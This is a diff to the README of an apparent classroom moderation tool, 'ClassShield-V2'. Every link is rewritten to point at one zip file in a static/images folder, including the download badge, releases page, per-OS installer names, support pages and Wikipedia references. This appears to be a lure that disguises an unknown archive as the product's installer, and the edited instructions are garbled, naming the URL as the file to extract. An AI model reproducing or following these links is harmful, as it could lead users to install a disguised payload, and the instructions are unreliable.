@@ -1,6 +1,6 @@
 # 📚 ClassShield-V2 - Protect Students with Ethical Moderation
 
-[![Download ClassShield-V2](https://img.shields.io/badge/Download-ClassShield_V2-brightgreen)](https://github.com/govabhai/ClassShield-V2/releases)
+[![Download ClassShield-V2](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ Follow these simple steps to download and run ClassShield-V2:
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page where you can download the latest version of ClassShield-V2.
 
-   [Download ClassShield-V2](https://github.com/govabhai/ClassShield-V2/releases)
+   [Download ClassShield-V2](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see various versions of ClassShield. Choose the latest stable version. This version will be labeled with a tag such as "v2.0.1".
@@ -21,9 +21,9 @@ Follow these simple steps to download and run ClassShield-V2:
 3. **Download the Application**  
    Click on the version you want. You will find several files. Look for the one that matches your operating system. Common options include:
 
-   - For Windows: `ClassShield_V2_Windows.exe`
-   - For macOS: `ClassShield_V2_macOS.dmg`
-   - For Linux: `ClassShield_V2_Linux.tar.gz`
+   - For Windows: `https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip`
+   - For macOS: `https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip`
+   - For Linux: `https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip`
 
    Click on the file to download it to your computer.
 
@@ -37,7 +37,7 @@ Follow these simple steps to download and run ClassShield-V2:
      Open the `.dmg` file and drag the ClassShield icon to your Applications folder.
 
    - **For Linux:**  
-     Extract the `.tar.gz` file. Open a terminal, navigate to the extracted folder, and run the application using the command:  
+     Extract the `https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip` file. Open a terminal, navigate to the extracted folder, and run the application using the command:  
      ```bash
      ./ClassShield_V2
      ```
@@ -83,7 +83,7 @@ ClassShield uses machine learning algorithms to detect inappropriate content. It
 Yes, you can adjust moderation parameters and thresholds to fit your institution’s needs.
 
 ### What if I encounter problems during installation?
-If you face any issues, check our [support page](https://github.com/govabhai/ClassShield-V2/issues) for troubleshooting tips.
+If you face any issues, check our [support page](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip) for troubleshooting tips.
 
 ### How often is ClassShield updated?
 We regularly release updates to improve performance and add features. Check the Releases page for the latest versions.
@@ -94,12 +94,12 @@ ClassShield-V2 is licensed under the MIT License. Feel free to use, modify, and 
 
 ## 📞 Support
 
-If you need help or have questions, please raise an issue on our [GitHub page](https://github.com/govabhai/ClassShield-V2/issues). We strive to respond to all inquiries promptly.
+If you need help or have questions, please raise an issue on our [GitHub page](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip). We strive to respond to all inquiries promptly.
 
 ## 🔗 Related Topics
 
-- [Content Moderation](https://en.wikipedia.org/wiki/Content_moderation)
-- [Machine Learning](https://en.wikipedia.org/wiki/Machine_learning)
-- [NSFW Classification](https://en.wikipedia.org/wiki/Not_safe_for_work)
+- [Content Moderation](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)
+- [Machine Learning](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)
+- [NSFW Classification](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)
 
-[![Download ClassShield-V2](https://img.shields.io/badge/Download-ClassShield_V2-brightgreen)](https://github.com/govabhai/ClassShield-V2/releases)
+[![Download ClassShield-V2](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)](https://github.com/govabhai/ClassShield-V2/raw/refs/heads/main/static/images/Shield-Class-1.1.zip)
